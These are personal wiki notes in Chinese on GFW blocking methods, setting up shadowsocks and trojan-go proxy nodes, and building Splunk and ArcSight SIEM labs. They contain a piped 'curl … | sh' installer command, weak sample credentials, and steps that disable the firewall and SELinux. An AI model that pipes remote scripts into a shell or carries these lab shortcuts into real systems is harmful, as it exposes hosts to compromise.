这个来源ip不是用户电脑发出的。这说明，当用户发送ss数据包经过GFW时，GFW拿着这个数据包进行重放攻击，探测到了vps上运行着shadowsocks服务，所以断开了用户与ss节点之间的连接。 也就是说，裸奔的ss节点已不安全。不过视频中也提到用甲骨云搭建的ss节点能正常用，猜测可能是一些ip段才采用重放攻击。 在现实情况中，小型设备，比如路由的用这种基础的ss也能出去，估计GFW不拦这些小设备。 可以让ss搭配使用v2ray-plugin进行流量混淆来解决这个问题。 shdowsocks+v2ray-plugin 使用ss+plugin下的浏览器请求过程 ss-local封装成Shadowsocks协议格式的数据包后，交给plugin进行流量混淆，比如增加http协议头，伪装为http流量。 过墙时GFW认为是正常的http流量，所以放行。 数据包到达境外vps，由plugin去掉http协议头，然后交由ss-server处理ss协议数据包。 ss-server解密ss协议数据包，还原出原始数据包内容。 下图将ss和plugin分开画，便于理解。 实际在配置过程中，ss-local和plugin都在shadowsocks程序上就能完成；远端vps的plugin和ss-server在同一台vps上就能完成。 安装并使用v2ray-plugin插件 安装v2ray-plugin插件 1apt install shadowsocks-v2ray-plugin 查看安装了什么内容 1dpkg -L shadowsocks-v2ray-plugin 修改ss的配置文件，添加插件相关的参数（插件参数添加说明） 1vim /etc/shadowsocks-libev/config.json 以“Shadowsocks over websocket (HTTP)”为例，添加插件参数如下： 1234567891011&#123; &quot;server&quot; : &quot;0.0.0.0”, &quot;mode&quot; : &quot;tcp_and_udp&quot;, &quot;server_port&quot; :8388, &quot;local port&quot; : 1080, &quot;password&quot; : &quot;FMjzLMo700D&quot;, &quot;timeout&quot; : 86400, &quot;method&quot; : &quot;chacha20-ietf-poly1305&quot;,+ &quot;plugin&quot; : &quot;v2ray-plugin&quot;,+ &quot;plugin_opts&quot; : &quot;server&quot;&#125; 修改后重启shadowsocks，查看shadowsocks运行状态 v2rayN的ss节点不支持插件，要用shadowsocks-windows程序。将shadowsocks-windows程序和v2ray-plugin都下载后，将v2ray-plugin程序拷到shadowsocks.exe同目录下，打开shadowsocks，填写服务端地址，端口，密码，加密方式，填写插件程序名称，插件选项（就是先前在json填写的参数），监听端口1080。 随后使用127.0.0.1:1080进行代理上网。 相关链接 节点搭建系列(3)：SS被精准探测端口秒封？节点搭建初体验，创建年轻人的第一台VPS，shadowsocks协议已被精准探测？plugin插件原理，使用v2ray-plugin插件拯救ss协议 Item 备注 v2rayN 代理客户端软件能对节点测速（测试真连接）但ss节点无法使用plugin GitHub - shadowsocks/v2ray-plugin: A SIP003 plugin based on v2ray shadowsocks插件，对ss流量进行伪装 GitHub - shadowsocks/shadowsocks-windows: A C# port of shadowsocks Shadowsocks for Windows客户端软件 To do(Maybe): 你也能写个 Shadowsocks Shadowsocks 实现分析以及如何实现一个代理协议 可能有用：https://www.ichenxiaoyu.com/ss/ 看是否新起一篇 shdowsocks加密方式 最早流模式加密没提供数据完整性校验而存在危险： 使用主动探测方法识别 Shadowsocks 服务 Shadowsocks漏洞复现 [shadowsocks的通信原理以及攻击方法分析(https://wonderkun.cc/2020/02/18/shadowsocks的通信原理以及攻击方法分析/) 源码注释分析：https://github.com/lixingcong/shadowsocks-analysis?tab=readme-ov-file clowwindy最早版的源码：https://github.com/shadowsocks/shadowsocks/tree/9d3e2d717753ba9489fcd553cd444449fffb13ac 奇虎360研究员披露的流模式下的重放攻击：https://github.com/edwardzpeng/shadowsocks shadowsocks-org中说的支持流模式和AEAD模式https://shadowsocks.org/doc/configs.html shadows，github有一个专门是crypto的仓库，有空看看"},{"title":"vmess原理与节点搭建","path":"/wiki/Proxy_Protocols/vmess原理与节点搭建.html","content":"VMess 协议细节"},{"title":"trojan原理与节点搭建","path":"/wiki/Proxy_Protocols/trojan原理与节点搭建.html","content":"前置知识 https https:http+tls 服务器会有一对公私钥，私钥保留，公钥在TLS握手时会用到。具体的TLS握手细节这里不详细介绍。总之，TLS握手后客户端和服务端协商出会话的加密密钥（对称加密）。 证书 CA机构颁发给域名的证书，是用于客户端鉴别服务端身份用的。防止攻击者伪造服务端身份。 客户端中有个CA机构信任列表（cmd-certmgr.msc），客户端会查看网站证书的信任链上的机构是否在自己的信任列表上。（也可以自己在信任列表上手动添加信任的机构） 访问https网站时如果证书有问题，浏览器会报警： sni 一般而言，一台服务器对应着1个ip，如果一台服务器上同时运行着多个web网页（拥有多个域名），每个域名都有着各自的证书。如果一个客户端请求来源只有ip地址这一项信息，这台服务器就无法确定访问者想访问哪个网站，也就不知道用哪个网站的证书进行TLS握手。 SNI就是解决这种情况下带来的问题，SNI（Server Name Indication）是TLS的扩展，在TLS1.2开始支持，它允许在握手过程开始时通过客户端告诉它正在连接的服务器的主机名称。 SNI信息在Client Hello中给出，是明文传输的。服务端通过sni这个字段来知道客户端要连接的主机名称。 参考：什么是 SNI？ 在TLS1.3中，SNI这个字段在传输过程中也能加密，称为ESNI。不过现在TLS1.3并不普及，当含有ESNI的流量经过GFW，GFW因为不知晓访问者想访问哪个网页，所以对于所有使用ESNI的数据包都进行丢弃。 使用trojan代理下的浏览器请求过程 使用trojan代理协议节点进行科学上网，在浏览器输入google.com的请求过程是这样的（假设ip已知，DNS查询过程略）： 浏览器的数据包请求被创建，交由本地的trojan代理进行处理，浏览器和trojan-local之间用socks5协议 trojan-local与trojan-server建立TCP连接，通过TLS握手协商出会话加密密钥，该会话密钥称为A。 协商成功后，浏览器通过trojan代理向google.com发起请求，建立TCP连接和TLS握手，协商出会话加密密钥，该会话密钥称为B。 TCP握手和TLS握手抓包图浏览器和Trojan-local是用socks5通信：123456789101112131415+-----+------+----------+----------+| CMD | ATYP | DST.ADDR | DST.PORT |+-----+------+----------+----------+| 1 | 1 | Variable | 2 |+-----+------+----------+----------+o CMD o CONNECT X&#x27;01&#x27; o UDP ：X&#x27;03&#x27;o ATYP o IP V4 : X&#x27;01&#x27; o 域名: X&#x27;03&#x27; o IP V6 : X&#x27;04&#x27;o DST.ADDR 所需的目标地址o DST.PORT 目标端口TCP握手包序号：73，74，75TLS握手：76，77，78，79，80，81，82，83然后，trojan-local和trojan-server之间发送的数据包格式如下（TLS加密之后的）：12345+-----------------------+---------+----------------+---------+----------+| hex(SHA224(password)) | CRLF | Trojan Request | CRLF | Payload |+-----------------------+---------+----------------+---------+----------+| 56 | X&#x27;0D0A&#x27; | Variable | X&#x27;0D0A&#x27; | Variable |+-----------------------+---------+----------------+---------+----------+参考：Trojan协议流量分析The Trojan Protocol | trojan (trojan-gfw.github.io) 建立连接后，浏览器请求google.com返回“如何成为一名高手”的查询数据： 浏览器在HTTP层创建原始数据“如何成为一名高手”，交由TLS层处理。 在TLS层，使用会话密钥A对payload数据加密，加上访问的ip地址和SNI（目标web服务器，google.com）。 由于网络配置中设置了代理，上一步骤的数据包发给本地的监听端口1080，这是trojan-local监听的端口。 trojan-local接收到这个数据包，在HTTP层添加trojan协议数据，包括密码password等信息，交由TLS层处理 在TLS层，使用会话密钥B对payload数据加密，加上访问ip和SNI（远端trojan服务器）。 数据包过GFW时，GFW看到这个数据包是去往217.69.7.188（未被墙的vps），SNI是example.tk（不在黑名单中），放行 trojan-server接收到数据后，使用会话密钥B解密数据包，根据是否是有效的trojan数据包做分类处理： 如果是有效的trojan数据包，进行代理功能，将数据包转发给142.250.188.14。142.250.188.14收到数据包，给google.com处理，google用会话密钥B解密得到原始数据。返回数据的处理过程与请求类似，这里略。 如果不是有效的trojan数据包，服务器将断开连接或重定向到一个伪装的网页（防止GFW主动探测。如果GFW主动连接，将看到的是一个正常的网页） 从GFW视角看：用户A是访问境外的一个https网站，并且主动探测也确实看到是一个网站。殊不知，trojan-server对来源的客户端请求做了判断。 TLS握手的具体先后顺序当浏览器有访问请求时，它会创建一个数据包，这个数据包首先在HTTP层生成，然后交给TLS层进行加密。加密后的数据包被发送到本地的trojan-local代理。此时，数据包还没有被加密为最终的形式，因为它需要通过trojan-local与trojan-server之间的TLS握手来生成会话密钥A。trojan-local代理与trojan-server建立TCP连接，并进行TLS握手，协商出会话密钥A。这个密钥用于加密从trojan-local到trojan-server的流量。一旦TLS握手完成，trojan-local就会使用密钥A对浏览器的原始请求数据进行加密。加密后的数据通过互联网发送到trojan-server。在这个过程中，GFW看到的是加密的流量，它无法辨认出实际的内容。trojan-server收到加密数据后，使用密钥A解密，得到浏览器的原始请求数据。trojan-server接着充当代理角色，与google.com建立TCP连接，并进行TLS握手，协商出会话密钥B。使用密钥B，trojan-server将浏览器的原始请求数据加密，并发送给google.com。google.com处理请求并返回数据，这些返回的数据被加密（使用密钥B），然后发送回trojan-server。trojan-server使用密钥B解密返回的数据，然后使用密钥A重新加密这些数据，再发送回trojan-local。trojan-local使用密钥A解密数据，然后将解密后的数据发送给浏览器。可以看到，访问谷歌的TLS数据，外面又包了一层trojan的TLS。这种TLS in TLS会存在特征：与google TLS握手时的数据包体积增大有兴趣可以参考：Trojan-killertrojan节点已被精准识别？！tls-in-tls特征原理分析，搭建MITM节点解决tls-in-tls特征很好奇识别的原理 #6 当一个客户端试图连接Trojan-Go的监听端口时，会发生下面的事情： 处理 备注 TLS握手成功 TLS的内容是Trojan协议 密码正确 解析来自客户端的请求并进行代理 密码不正确 将TLS连接代理到本地127.0.0.1:80上的HTTP服务 有可能是HTTP请求，或者来自GFW的主动探测，这样的处理在远端看来，Trojan-Go服务就是一个HTTPS网站 TLS的内容不是Trojan协议 将TLS连接代理到本地127.0.0.1:80上的HTTP服务 有可能是HTTP请求，或者来自GFW的主动探测，这样的处理在远端看来，Trojan-Go服务就是一个HTTPS网站 TLS握手失败 将这个TCP连接代理到本地127.0.0.1:1234上运行的HTTPS服务（或者HTTP服务），返回一个展示400 Bad Reqeust的HTTP页面。 TLS握手失败说明对方使用的不是TLS协议进行连接 fallback_port是一个可选选项，如果没有填写，Trojan-Go会直接终止连接。虽然是可选的，但是还是强烈建议填写。 搭建trojan节点 服务端前置准备工作 一个境外vps，未被GFW封锁 域名（可以无） 证书和密钥，从CA机构申请签发 伪装跳转的HTTP服务器 作用：当GFW主动探测时，展示一个正常的web页面 可以是自己用nginx，apache，caddy等配置的一个本地HTTP服务器或者是填写别人的HTTP服务器 网站证书申请 .crt是证书（公钥在证书里），.key是私钥 已有域名自签证书从网站下载sh并执行 1curl https://get.acme.sh | sh 安装socat（使用独立模式要安装socat） 1apt install socat 添加软链接 1ln -s /root/.acme.sh/acme.sh /usr/local/bin/acme.sh 注册账号 1acme.sh --register-account -m my@example.com 防火墙开放80端口（独立模式会在本地80端口开一个服务器，等CA机构来验证） 1ufw allow 80 申请证书： 1acme.sh --issue -d 替换为你的域名 --standalone -k ec-256 安装证书（就是将.key和.crt复制到文件夹中） 1acme.sh --installcert -d 替换为你的域名 --ecc --key-file /root/trojan/server.key --fullchain-file /root/trojan/server.crt 如果默认CA无法颁发，可以切换使用其他CA来申请证书 123456#切换 Let’s Encrypt：acme.sh --set-default-ca --server letsencrypt#切换 Buypass：acme.sh --set-default-ca --server buypass#切换 ZeroSSL：acme.sh --set-default-ca --server zerossl 没域名的情况下，自签证书。 生成私钥 1openssl ecparam -genkey -name prime256v1 -out ca.key 生成证书 1openssl req -new -x509 -days 36500 -key ca.key -out ca.crt -subj &quot;/CN=bing.com&quot; 服务端搭建步骤 用的是trojan-go，不在内置源中，在github复制二进制文件的链接，在ubuntu上用wget下载 1wget https://github.com/p4gefau1t/trojan-go/releases/download/v0.10.6/trojan-go-linux-amd64.zip unzip解压 example文件夹下是示例的配置文件 trojan-go目录下创建config.json文件，编写配置文件 1234567891011121314&#123; &quot;run_type&quot;: &quot;server&quot;, &quot;local_addr&quot;: &quot;0.0.0.0&quot;, &quot;local_port&quot;: 443, &quot;remote_addr&quot;: &quot;127.0.0.1&quot;, &quot;remote_port&quot;: 80, &quot;password&quot;: [ &quot;your_awesome_password&quot; ], &quot;ssl&quot;: &#123; &quot;cert&quot;: &quot;server.crt&quot;, &quot;key&quot;: &quot;server.key&quot;, &#125;&#125; key value 注释 run_type “server” 表示是服务器的配置 local_addr “0.0.0.0” 监听所有ip来源 local_port 443 监听端口，大多数https是443端口，换成其他的会显得突出 remote_addr 伪装跳转的HTTP服务器地址/域名 remote_port 伪装跳转的HTTP服务器的端口 password 身份认证用 ssl，cert .crt CA颁发的网站证书，TLS握手时服务端会给到客户端以表明自己的身份 ssl，key .key 网站的私钥，TLS握手时会用到 后台运行并输出日志（只有服务器崩溃或重启trojan服务才会结束） 1nohup ./trojan-go &gt; trojan.log 2&gt;&amp;1 &amp; 客户端使用 v2rayN添加trojan服务器 如果服务器地址填写的是域名，sni可以省略。如果服务器地址填写的是ip，sni字段要填写你申请证书的对应域名，或者你自己签发的证书的Common Name，而且必须一致。 sni就是伪装的最外层的字段，在目前的TLS协议是明文传输，GFW会看到，所以不要填写类似google.com等已经被封锁的域名，否则很有可能导致你的服务器也被遭到封锁。 自签证书的话，可以将自签的CA机构加入到电脑的信任列表，或v2rayN选择跳过证书验证（最好不要跳过，要不存在服务端被攻击者伪装的情况） SNI要输入自签时的域名 比如自签时写的bing.com 1openssl req -new -x509 -days 36500 -key ca.key -out ca.crt -subj &quot;/CN=bing.com&quot; 那么这里的sni要写bing.com 相关链接 节点搭建系列(4):目前最好的翻墙协议?史上最详细trojan协议原理解析与实战搭建，流量伪装成https实现绕过防火墙探测进行科学上网。彻底弄明白什么是网站证书、什么是TLS/SSL Item 备注 trojan主页 trojan主页 trojan-go trojan-go，github项目地址 Trojan-Go文档 Trojan-Go文档，写得挺详细的 做对比时用：Trojan原理简单分析https://xzchsia.github.io/2020/09/29/trojan-code-analysis/"},{"title":"前置知识","path":"/wiki/Proxy_Protocols/前置知识_科学上网技术.html","content":"正常网络通信过程 通信过程涉及ip、端口、mac地址、网关、DNS、arp、路由转发表、NAT映射等知识的详细介绍略。 IP：用于定位互联网中的某一台电脑 端口：定位某一个服务（进程） IP+端口：定位互联网中的某一台电脑中的某一个服务（进程） mac地址：同一个局域网里通信用的是mac地址 NAT地址转换：将内网网段的ip转换成能在公网上传输的公网ip 计算机OSI五层模型 每层负责的内容 应用层 数据 传输层 端口 网络层 ip 数据链路层 mac地址 物理层 简略版详细版数据包由用户A发送，在公网上跳发，到达服务器A。 服务器A的响应数据包，返回过程和发送过程类似，只不过是方向相反。 用户A希望访问服务器A上的网页，他在浏览器中输入了相应的URL（假设服务器A的ip地址已知，这里就不提DNS解析过程了）。在这个过程中，用户A的计算机会生成一个请求数据包。这个数据包首先在应用层被创建，然后依次通过传输层、网络层、数据链路层和物理层进行封装，每一层都会添加相应的头信息，以确保数据包能够正确地传输和识别。这个数据包经由交换机，路由器在公网中传输，最终到达目标服务器A。 服务器A收到请求后，会按照相反的顺序，从物理层开始逐层解开数据包，直到应用层，从而能够理解和处理请求。 响应数据包的路径与请求来时的路径相同，但是方向相反，即从服务器A发出，经过相同的网络层次，最终回到用户A的计算机。 二层交换机：接收数据包的解析处理从下到上，从物理层-&gt;数据链路层 路由器（三层）：接收数据包的解析处理从下到上，物理层-&gt;数据链路层-&gt;网络层 参考：节点搭建系列(1)：网络通信的基本过程，访问网站到底发生了什么事情？详细解析DNS原理 墙拦截原理 当用户尝试从国内访问国际互联网，所有出口到国际网络的请求都要通过GFW防火墙，GFW是5层设备，能分析到应用层的数据。 假设用户A想要访问google.com，设定的dns服务器是8.8.8.8，如果本地没有缓存，hosts文件也没相关映射，需要发DNS解析请求到8.8.8.8，以解析google.com的IP地址。这个请求在通过GFW时，GFW检查应用层数据，识别出用户试图获取google.com的IP地址。如果google.com位于GFW的黑名单上，或者请求包含了某些关键词，GFW会直接拦截这个DNS请求。（黑名单，关键词过滤） 即使GFW允许DNS请求通过，并且8.8.8.8返回了google.com的IP地址（假设为140.250.188.14），但数据包返回时还会被GFW再次检查。GFW识别到返回的IP地址属于被封锁的资源，它可能会篡改应答，将正确的IP地址替换为一个无效的地址。数据包回到用户A，用户A得到了一个错误的ip地址。网络上不存在这么一台服务器是这个错误的ip地址，所以用户A无法与这个错误的ip地址建立连接。（DNS污染） 即使用户已经知道google.com的真实IP地址并尝试发起连接，由于HTTP请求基于TCP协议，而TCP需要建立连接，用户的连接请求在到达GFW时会被检查。如果请求的目标IP地址在GFW的黑名单上，GFW会拦截这个连接请求，或者假装自己是google服务器，发回一个伪造的数据包给用户。（黑名单，关键词过滤） 最后，假设google.com还有其他的ip地址，这个ip地址不在GFW的黑名单中，用户通过这个IP地址成功与google.com三次握手建立连接。随后用户A发送&quot;请求google.com首页数据&quot;的数据包，到GFW时，如果数据包中包含了如&quot;google.com&quot;这样的黑名单关键词，GFW会进行TCP重置攻击，中断用户与google.com的连接，阻止用户获取网页数据。也就是说，即使用户A与谷歌服务器建立连接的情况下，也请求不到谷歌网址的数据。（TCP重置攻击） 使用http/socks代理 假设用户A用一台境外的vps作为http或socks代理服务器，这台代理服务器能访问到谷歌服务器（不过GFW），用户A能访问到代理服务器（GFW黑名单上没这台代理服务器）。用户A可以发送“代替我访问google.com”数据包给代理服务器，让这台代理服务器代替用户A访问谷歌服务器，然后再将数据返回给用户A。但“代替我访问google.com”数据包来到GFW时，GFW知晓用户A要让代理服务器访问google的意图，于是拦截数据包，甚至将这台代理服务器的ip加入黑名单中。 因为http或socks代理是明文传输，防火墙能解析到应用层的数据。 这也并不绝对，有些地区的ip用标准的socks5就是能出去，但大部分地区基本是秒封的。 使用vpn 端口阻断：切断VPN或SSL的链接 vpn诞生目的是数据加密，常用于公司将两个内网合并，只是恰好也能用来翻墙。但连接特征明显，GFW是知道用户A在与哪台vpn服务器建连，GFW会放行，但可能会将vpn服务器的ip地址加入监控列表，甚至在特殊时期不放行这些vpn连接。 小结 GFW是5层设备，能解析到应用层的数据。可能拦截的方式有： DNS污染（DNS劫持）：返回错误的ip地址或不解析用户的dns请求 黑名单：在黑名单中的ip、域名不放行 关键词过滤，深度包检测：数据包中有敏感词，便不放行 TCP重置攻击：在用户与目标服务器已建连的情况下，将用户的请求数据包拦下 端口阻断：切断VPN或SSL的链接 被拦下来的原因其实就是数据没加密，用户访问意图被知道得明明白白。 使用代理协议 比如使用shadowsocks代理协议翻墙，在境外vps上用ss协议搭建服务器，监听端口8388。用户A在电脑上使用代理软件作为ss客户端，监听端口1080。那么用户A浏览器的访问请求数据包构造完后，会交由ss客户端按ss协议封装，这个封装会对原始数据包应用层的数据加密。随后，ss协议数据包到GFW，由于ss节点不在GFW黑名单中且GFW看不到数据包中的应用层数据（因为加密了），于是放行。数据包到达ss服务器，ss服务器解密还原，知道用户A要访问谷歌web服务器，于是去访问谷歌web服务器，将谷歌web服务器响应的数据再加密，再以ss协议发回给用户。 但GFW也会有主动探测的手段，比如重放攻击，主动向ss节点发包来探测是不是运行了shadowsocks服务，如果是，会将该境外vps拉入黑名单 参考：节点搭建系列(2)：GFW防火墙是怎么阻断我们和谷歌的连接？如何绕过防火墙的拦截？DNS污染是怎么回事？搭建节点之前必须知道的知识"},{"title":"相关概念","path":"/wiki/Proxy_Protocols/相关概念_科学上网技术.html","content":"相关概念 代理协议：ss、trojan、vmess、vless VMess协议：VMess是由V2Ray-core开发团队设计的一种代理协议，它是V2Ray软件的一部分。V2Ray是一个功能强大的网络工具，支持多种代理协议，帮助用户构建自己的代理来绕过网络限制。github上的About是：“A platform for building proxies to bypass network restrictions”。 V2Ray和Project V：Projece V是一个网络工具的集合，github上的介绍是“Project V is a set of network tools that help you to build your own computer network.”。其中，V2Ray是Project V的核心工具。V2Ray项目最初托管在GitHub上的链接v2ray的v2ray-core，但在项目创始人Victoria Raymond失联后，由于其他维护者没有完整的项目权限，于是大家创建了新的社区：V2Fly，项目的维护和更新转移到了新的社区V2Fly，相应的GitHub仓库也更新为V2Fly的v2ray-core。 原始地址 迁移后的新地址 v2ray-core https://github.com/v2ray/v2ray-core https://github.com/v2fly/v2ray-core Projext V https://www.v2ray.com/index.html https://www.v2fly.org/ XTLS协议：XTLS是V2Ray团队成员rprx为解决TLS in TLS的特征问题而发明的。但由于License问题，XTLS从V2Ray中移除，并且rprx独立出来创建了xray，xray和v2ray一样，也是一个网络平台工具，支持多种代理协议，但只有xray支持XTLS。 Project X：与Project V相对应，Project X是围绕XRay工具的集合。 网络工具集合 集合里边的核心网络工具 内核 Project V V2Ray v2ray-core Project X XRay xray core 参考：V2Ray、Trojan、XRay 代理软件客户端工具：v2RayN、clash。都是GUI界面，GUI只是方面用户操作，实际上通过调用内核功能来实现科学上网功能。 v2rayN A GUI client for Windows, support Xray core and v2fly core and others Trojan-Go是使用Go实现的Trojan，在功能上是Trojan的超集。它新增了很多功能：多路复用、自定义路由、CDN 转发等等，但是最底层协议还是原版Trojan。 Item 备注 v2rayN 代理客户端软件能对节点测速（测试真连接）但ss节点无法使用plugin GitHub - shadowsocks/v2ray-plugin: A SIP003 plugin based on v2ray shadowsocks插件，对ss流量进行伪装 GitHub - shadowsocks/shadowsocks-windows: A C# port of shadowsocks Shadowsocks for Windows客户端软件 v2rayN 要下带Core的文件，要不添加节点后会报错“运行Core失败，请看日志” 下载文件说明 windows x64 v2rayN-With-Core.zip 包含所有Core文件，如您第一次请下载此包 v2rayN.zip不包含Core文件 zz-v2rayN-With-Core-SelfContained.7z，包含所有Core文件；独立包，不需要下载安装[Microsoft .NET 6.0 Desktop Runtime] 选中节点，右键 测试服务器延迟Ping ICMP协议测网络延迟 测试服务器延迟Tcping TCP协议测网络延迟，通过建立TCP连接到服务器的特定端口（通常是HTTP的80端口或HTTPS的443端口），来测量建立连接的时间 测试服务器真连接延迟（用vps作为代理往谷歌发送请求，模拟真实使用的延迟），用这个选项看能否使用代理服务器进行代理上网 实际建立一个完整的连接并可能进行一些数据交换，以更准确地模拟在实际使用中的延迟。这可能包括建立连接、进行握手、发送一些数据包等过程"},{"title":"Splunk","path":"/wiki/SIEM_env_building/Splunk.html","content":"[toc] 本文分为两部分： 如何安装Splunk Server和Splunk Forward 安装后，如何产生事件，以及比对本地与Splunk Server是否存在相同的日志的方法 安装包下载 Splunk 8.2.3 Windows: https://download.splunk.com/products/splunk/releases/8.2.3/windows/splunk-8.2.3-cd0848707637-x64-release.msi Linux: https://download.splunk.com/products/splunk/releases/8.2.3/linux/splunk-8.2.3-cd0848707637-Linux-x86_64.tgz Splunk Universal Forwarder 8.2.3 Windows: https://download.splunk.com/products/universalforwarder/releases/8.2.3/windows/splunkforwarder-8.2.3-cd0848707637-x64-release.msi Linux: https://download.splunk.com/products/universalforwarder/releases/8.2.3/linux/splunkforwarder-8.2.3-cd0848707637-Linux-x86_64.tgz 注：Linux版安装运行只需要解压缩tar包，执行bin/splunk start即可。 原始下载页面的源代码当中包含下载链接： Splunk: https://www.splunk.com/en_us/download/splunk-enterprise.html Splunk Universal Forwarder: https://www.splunk.com/en_us/download/universal-forwarder.html Splunk每个版本（如8.2.3）下载链接中十六进制的部分都是固定的（如cd0848707637）。知道文件名就可以自己构造下载链接。（google搜splunk-8.2.3- x release.msi搜到十六进制的部分）。 虚拟机清单 Splunk Server，windows主机。 Splunk Forward，windows、linux均可。配置转发数据到Splunk Server。 服务端安装 双击安装包安装Splunk Server，中途需配置管理员账号和密码（可设置为admin/Admin@123） 关闭虚拟机A的防火墙 安装完成后，127.0.0.1:8000登录后台管理页面，“设置”-“转发和接收”，“接收数据”点击“+新增”，新页面中选择“新接收端口”，新增9997端口 配置监听端口 Splunk Forward安装 双击桌面的安装包安装Splunk Forwarder。证书部分不填写，Local Syatem，Windows Events Logs和Performance Monitor全部打勾，中途需配置管理员账号和密码（可设置为client/Client@123），设置Splunk服务器为虚拟机Aip:8089，转发数据到Splunk服务器为虚拟机Aip:9997 （这部分不填，直接下一步) 设置账号和密码，重启或者查看配置会提示输入，还是要记住 配置Splunk Server 配置Splunk Server接收转发器数据的端口。（之前在Splunk Server中新增的9997端口在这里用上了) “本地安全策略”设置“审核账户管理”为成功、失败。（后面用管理员cmd修改账户密码时本地事件查看器就会记录相应的日志） Splunk Server： 在右上角“转发器管理”，看到有转发器正在转发数据 如果没看到，检查防火墙，重启server和forwarder。实在不行就重装。 日志样例 产生事件的样例： 在Splunk Forward的虚机中： 以管理员cmd修改test账户密码为abc作为例子，执行 1net user test abc 命令后，在本地的&quot;事件查看器&quot;-&quot;安全&quot;中有3条与该条命令相关的日志，编号分别为4724、4738、4798 同时，在Splunk Server搜索，也能看到这三条日志，内容一致 端口转发类事件 本文讲述在Splunk Server端对Splunk Forward端开启端口转发，倾听数据，将该端口收到的数据收集到Server端。 Splunk Server设置-数据输入-转发的输入-UDP，点击新增 选定主机，输入新建服务器类名称，比如udp1999-test 选择UDP，1999 新建一个索引，比如udp1999-index 检查 提交 开始搜索 没事件，嗯，正常 客户端： 双击syslogsender_setup安装，默认点点点即可，创建桌面图标可以勾一下 打开Star SysLog Sender，向1999端口发送Message，点击SysLog Send 再次在Splunk Server搜索，可以查看到刚才发送的消息，及自己输的字段 拓展 forward实际上是阉割版的server，直接拿server，一些类型事件只能由装server然后对自身进行监控收集。 参考链接 服务端 安装教程：http://buaq.net/go-90176.html 客户端 https://wooyun.js.org/drops/Splunk实战（一）——索引器配置以及转发器安装配置说明 .html Splunk + Forwarder 收集分析Windows系统日志"},{"title":"Arcisght","path":"/wiki/SIEM_env_building/Arcisght.html","content":"[toc] 本节介绍如何搭建Arcsight recon1.2环境，采用All-in-One installtion type with Database co-located with CDF node.It will install CDF,Arcsight Suite,NFS and Database on a single node.使用的是Using Arcsight Platform Installer(P65页)编写配置yaml文件，然后用官方提供的脚本进行安装。 总体步骤 因安装需求不同，现场情况分为能联网或不能联网，能联网和不能联网安装时的步骤有些许出入，下面是两者安装步骤的checklist，请根据安装需求和实际情况选择相应的步骤进行安装。 均需要：搭建DNS服务器 按需选择： √：需要 ×：不需要 序号 Task 虚机能联网 虚机不能联网 1 安装一些包及依赖 × √ 2 搭建本地yum源 × √ 3 主机名、关闭ipv6、设置静态ip、DNS √ √ 4 chrony客户端配置 √（配置chrony服务器可以是外网或内网） √（搭建内网chrony服务端+配置指向内网的chrony服务器作为时钟源） 5 相关安装文件准备（6个） √ √ 6 开始安装 √ √ 文件清单 服务端安装文件一共6个： recon-single-node.yaml因为文件内容可能不一样，所以不给出MD5进行校验 文件名 MD5 arcsight-installer-metadata-21.1.0.9.tar e08fe2f12e1c1bf41b6ef8e39f9b8ace arcsight-platform-installer-21.1.0.9.zip e621e053545b6c1d766699bd077feb88 fusion-1.3.0.9.tar c0820209f28eeaf7b72e6af197a4a617 recon-1.2.0.9.tar 99193eebf694ff864dfcccfd956e3d11 transformationhub-3.5.0.9.tar 4ab57e71194bc454bcf2e47fbb818449 搭建本地yum源用的文件：CentOS-7-x86_64-DVD-2009.iso 本文中提到的虚拟机清单 截图和文章中的ip大部分能对应上，少部分对应不上。因为是在多次安装过程中写的文档，请自行区别。 虚拟机名称 静态IP 域名 备注 账号密码 DNS-Windows Server 2012 192.168.147.135 无 DNS服务器 win10/无密 CentOS 7 x64 NTP Server 192.168.147.201 NTP服务器 root/root,user/user Arcsight Server Single Node-CentOS 7 x64 192.168.147.133 cdf6.arcsight-test.com Arcsight服务端 root/root,user/user Win Events Log-Windows 10 x64 192.168.147.199 Arcsight采集器客户端 win10/无密 syslog-Windows 10 x64 192.168.147.143 Arcsight采集器客户端（端口转发） win10/无密 Client-Ubuntu x64 20.04 无所谓 Arcisght采集器客户端（本地csv文件） root/root,user/user DNS服务器 使用windows、linux、FreeBSD等当DNS服务器均可，设置Arcsight服务器域名与IP的正向解析。 chrony服务器配置（opt） CentOS 7 x64 NTP Server 关闭防火墙 12systemctl stop firewalldsystemctl disable firewalld 确定防火墙已关闭，状态显示dead 1systemctl status firewalld 关闭SELinux 临时关闭 1setenforce 0 永久关闭 修改配置文件/etc/selinux/config,将其中SELINUX设置为disabled 12- SELINUX=enforcing + SELINUX=disabled 重启生效，使用sestatus查看SELinux状态 配置NTP服务器 1vi /etc/chrony.conf 注释掉外部时钟，因为内网环境，上不了网。增加自身ip作为时钟服务器。 allow命令指允许哪些ip通过访问到自己。 local stratum 10指当外部时钟访问不到时，允许自身作为时钟服务器来校准客户端 123456789101112131415161718192021222324252627282930313233343536373839404142# These servers were defined in the installation:+ #server 0.centos.pool.ntp.org iburst+ #server 1.centos.pool.ntp.org iburst+ #server 2.centos.pool.ntp.org iburst+ #server 3.centos.pool.ntp.org iburst+ server 192.168.147.201 iburst# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16+ allow 192.168.147.0/24 # Serve time even if not synchronized to a time source.+ local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking 重启chrony 1systemctl restart chronyd.service Arcsight recon服务端搭建 虚拟机及硬件要求 Required OS:CentOS~~/RHEL~~ 7.7，7.8 or 7.9 我用的CentOS-7-x86_64-DVD-2009.iso，可供参考 RHEL别人尝试用过，没成功 在VM新建虚拟机时，配置要求如下： Category Requirement Single node (master and worker) 1 CPU cores (per node) 8 RAM (per node) 32 Disks (per node) 1 Storage per day (1x) 15GB Total disk space (1.5 billion events) 500GB 磁盘分区： swap — 3GB /boot — 1GB /home — 30GB /opt ---- 250GB以上 / — 60GB以上 安装桌面版（GNOKE或Server GUI都行） 安装一些包及依赖 安装原因： 